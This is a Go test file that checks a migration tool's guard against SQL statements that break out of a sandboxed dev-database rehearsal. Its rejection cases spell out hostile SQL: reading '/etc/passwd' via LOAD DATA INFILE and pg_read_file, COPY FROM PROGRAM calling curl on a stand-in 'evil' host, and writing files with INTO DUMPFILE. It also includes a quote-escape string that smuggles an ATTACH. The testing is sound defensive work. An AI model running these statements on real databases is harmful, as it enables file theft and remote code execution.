package atlasschema_test

import (
	"testing"

	qt "github.com/frankban/quicktest"

	"github.com/stokaro/ptah/internal/atlasschema"
)

func TestCheckPlanStatementsSandboxableRefusesEscapes(t *testing.T) {
	tests := []struct {
		name      string
		statement string
		construct string
	}{
		{
			name:      "sqlite_attach_database",
			statement: `ATTACH DATABASE '/tmp/target.db' AS victim`,
			construct: "ATTACH",
		},
		{
			name:      "sqlite_attach_without_database_keyword",
			statement: `attach '/tmp/target.db' as victim`,
			construct: "ATTACH",
		},
		{
			name:      "sqlite_detach",
			statement: `DETACH DATABASE victim`,
			construct: "DETACH",
		},
		{
			name:      "sqlite_vacuum_into",
			statement: `VACUUM INTO '/tmp/copy.db'`,
			construct: "VACUUM INTO",
		},
		{
			name:      "mysql_load_data_local_infile",
			statement: `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE users`,
			construct: "LOAD DATA INFILE",
		},
		{
			name:      "mysql_select_into_outfile",
			statement: `SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'`,
			construct: "SELECT ... INTO OUTFILE",
		},
		{
			name:      "mysql_select_into_dumpfile",
			statement: `SELECT payload FROM t INTO DUMPFILE '/tmp/x.so'`,
			construct: "SELECT ... INTO DUMPFILE",
		},
		{
			name:      "postgres_copy_from_program",
			statement: `COPY users FROM PROGRAM 'curl http://evil/x'`,
			construct: "COPY ... PROGRAM",
		},
		{
			name:      "postgres_copy_to_file",
			statement: `COPY users TO '/tmp/users.csv'`,
			construct: "COPY with a file path",
		},
		{
			name:      "postgres_dblink",
			statement: `SELECT * FROM dblink('dbname=target', 'SELECT 1') AS t(x int)`,
			construct: "dblink",
		},
		{
			name:      "postgres_dblink_exec_prefix",
			statement: `SELECT dblink_exec('dbname=target', 'DROP TABLE users')`,
			construct: "dblink",
		},
		{
			name:      "postgres_fdw_extension",
			statement: `CREATE EXTENSION postgres_fdw`,
			construct: "postgres_fdw",
		},
		{
			name:      "postgres_file_fdw_extension",
			statement: `CREATE EXTENSION file_fdw`,
			construct: "file_fdw",
		},
		{
			name:      "postgres_pg_read_file",
			statement: `SELECT pg_read_file('/etc/passwd')`,
			construct: "pg_read_file",
		},
		{
			name:      "postgres_lo_export",
			statement: `SELECT lo_export(loid, '/tmp/out.bin') FROM t`,
			construct: "lo_export",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			c := qt.New(t)

			err := atlasschema.CheckPlanStatementsSandboxable([]string{
				`CREATE TABLE ok (id integer)`,
				tt.statement,
			})

			// The refusal names the offending statement position and the
			// construct, and it must be recognizable as an escape refusal.
			c.Assert(err, qt.IsNotNil)
			c.Assert(atlasschema.IsPlanEscape(err), qt.IsTrue)
			c.Assert(err, qt.ErrorMatches,
				`pre-planned migration cannot be verified on a dev database: statement 2 uses `+tt.construct+`, which .*`)
			c.Assert(err, qt.ErrorMatches, `(?s).*Replaying it would not be a sandboxed rehearsal.*`)
		})
	}
}

func TestCheckPlanStatementsSandboxableAllowsOrdinaryDDL(t *testing.T) {
	tests := []struct {
		name      string
		statement string
	}{
		{
			name:      "table_named_attachment",
			statement: `CREATE TABLE attachment (id integer NOT NULL PRIMARY KEY)`,
		},
		{
			name:      "quoted_table_named_attach",
			statement: `CREATE TABLE "attach" (id integer)`,
		},
		{
			name:      "backticked_column_named_outfile",
			statement: "ALTER TABLE `reports` ADD COLUMN `outfile` text",
		},
		{
			name:      "quoted_column_named_infile",
			statement: `ALTER TABLE reports ADD COLUMN "infile" text`,
		},
		{
			name:      "string_literal_containing_attach",
			statement: `INSERT INTO notes (body) VALUES ('please ATTACH DATABASE later')`,
		},
		{
			name:      "string_literal_containing_copy_program",
			statement: `ALTER TABLE t ADD COLUMN note text DEFAULT 'COPY x FROM PROGRAM ls'`,
		},
		{
			name:      "comment_mentioning_attach",
			statement: "-- ATTACH DATABASE '/tmp/x.db' AS y\nCREATE TABLE ok (id integer)",
		},
		{
			name:      "copy_from_stdin_has_no_file_argument",
			statement: `COPY users (id, name) FROM STDIN`,
		},
		{
			name:      "ordinary_create_index",
			statement: `CREATE INDEX idx_posts_user_id ON posts (user_id)`,
		},
		{
			name:      "column_named_program",
			statement: `CREATE TABLE jobs (program text NOT NULL)`,
		},
		{
			name:      "vacuum_without_into",
			statement: `VACUUM`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			c := qt.New(t)

			c.Assert(atlasschema.CheckPlanStatementsSandboxable([]string{tt.statement}), qt.IsNil)
		})
	}
}

func TestCheckPlanStatementsSandboxableScansBothStringEscapeDialects(t *testing.T) {
	c := qt.New(t)

	// Under MySQL-family backslash escapes the literal ends at the escaped
	// quote and ATTACH is code; under PostgreSQL rules the same bytes parse
	// differently. Scanning both interpretations means neither reading can
	// smuggle an escape past the guard.
	statement := `INSERT INTO t VALUES ('\'); ATTACH DATABASE '/tmp/x.db' AS y; --')`

	err := atlasschema.CheckPlanStatementsSandboxable([]string{statement})

	c.Assert(atlasschema.IsPlanEscape(err), qt.IsTrue, qt.Commentf("err=%v", err))
}

func TestCheckPlanStatementsSandboxableAcceptsEmptyInput(t *testing.T) {
	c := qt.New(t)

	c.Assert(atlasschema.CheckPlanStatementsSandboxable(nil), qt.IsNil)
	c.Assert(atlasschema.CheckPlanStatementsSandboxable([]string{"", "   "}), qt.IsNil)
}
